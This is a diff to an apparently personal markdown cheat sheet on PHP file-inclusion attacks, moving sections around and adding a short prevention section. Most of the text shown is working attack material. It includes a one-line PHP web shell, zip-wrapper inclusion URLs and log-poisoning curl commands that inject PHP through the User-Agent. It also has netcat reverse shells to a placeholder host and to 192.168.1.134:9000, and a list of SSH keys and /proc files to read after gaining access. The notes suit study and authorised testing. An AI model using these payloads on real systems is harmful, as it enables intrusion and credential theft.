@@ -387,7 +387,7 @@ zero@pio$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg she
 
 Now, use the **zip** wrapper:
 ```
-http://<ip>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+http://<ip>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id 
 ```
 
 ### Phar 
@@ -451,41 +451,6 @@ Now...
 http://<ip>/index.php?language=/var/log/apache2/access.log&cmd=id
 ```
 
-
-
-
-
-
-
-
-
-
-We can check some important files:
-- **/home/user/.ssh/id_rsa ->** check credentials for a ssh connection, with **ssh2john** we can break any ssh password if its weak or we have it in a dictionary.
-- **/proc/sched_debug ->**  show many running scripts
-- **/proc/net/fib_trie ->** check network interfaces (with *grep -i  "host local" -B 1* we can get local ip).
-- **/proc/net/tcp ->** check port. The last four digits from the second column (rem_address), if we add a **0x** in Python before we can get the port (its common to not get ports like 80 here).
-
-
-
-
-#### Reverse Shell
-We can execute code accesing **/proc/self/environ**. We can modify the header in burpsuite to add:
-```php
-<?passthru('nc -e /bin/bash <ip> <port>');?>
-```
-To execute the reverse shell.
-
-#### Apache2
-In **/var/log/apache2/access.log** we can manipulate the user agent that the log is currently saving in the logs with curl. For example:
-```console
-> curl -s -H "User-Agent: <¿php system('whoami'); ?>" "http://localhost/example.php?file=/var/log/apache2/access.log"
-```
-Now we can execute code in the system.
-
-Also, we can try to login (for example with ssh). **auth.log** will save the login attempt, if we execute the page after the login we will execute the script.
-##### Maybe we need to encode the payload to base64
-
 Another example is the **/var/log/auth.log**. We can try to log in by ssh with and invalid user and see that all the trys are been saving in the log.
 If we log as a command, execute the log (loading with curl or in the web with LFI) we can execute the command and get a **reverse shell**:
 - First we encode the connection (with netcat).
@@ -502,19 +467,38 @@ Then we will try to log in with any password. Now we just need to reload the log
 > curl -s -H "User-Agent: <¿php system('whoami'); ?>" "http://localhost/example.php?file=/var/log/auth.log"
 ```
 
+---
 
-# Remote File Inclusion (RFI)
-Load files into the server.
+# Prevention
 
-We can create a plain file (**.txt**) with a php content:
+- **File Inclusion Prevention**: avoid passing any user-controlled inputs into any file inclusion functions or APIs 
+- **Preventing Directory Traversal**: use your programming language's (or framework's) built-in tool to pull only the filename (in PHP the function `basename()`) or sanitize the input 
+
 ```php
-<?php
-  passthru('nc -e /bin/sh 192.168.1.134 9000');
-?>
+while(substr_count($input, '../', 0)) {
+    $input = str_replace('../', '', $input);
+};
 ```
 
-Then we change the url with:
+- **Web Server Configuration**: set `allow_url_fopen` and `allow_url_include` Off
+- **Web Application Firewall (WAF)**: using some, like *ModSecurity*
+
+---
+
+# Other
+
+## Reverse Shell
+We can execute code accesing **/proc/self/environ**. We can modify the header in burpsuite to add:
+```php
+<?passthru('nc -e /bin/bash <ip> <port>');?>
 ```
-...?index=http://<ip>/revershell.txt
-```
-And then we can execute code.
+To execute the reverse shell.
+
+## Important things to check 
+
+We can check some important files:
+- **/home/user/.ssh/id_rsa ->** check credentials for a ssh connection, with **ssh2john** we can break any ssh password if its weak or we have it in a dictionary.
+- **/proc/sched_debug ->**  show many running scripts
+- **/proc/net/fib_trie ->** check network interfaces (with `grep -i  "host local" -B 1` we can get local ip).
+- **/proc/net/tcp ->** check port. The last four digits from the second column (rem\_address), if we add a **0x** in Python before we can get the port (its common to not get the port 80).
+
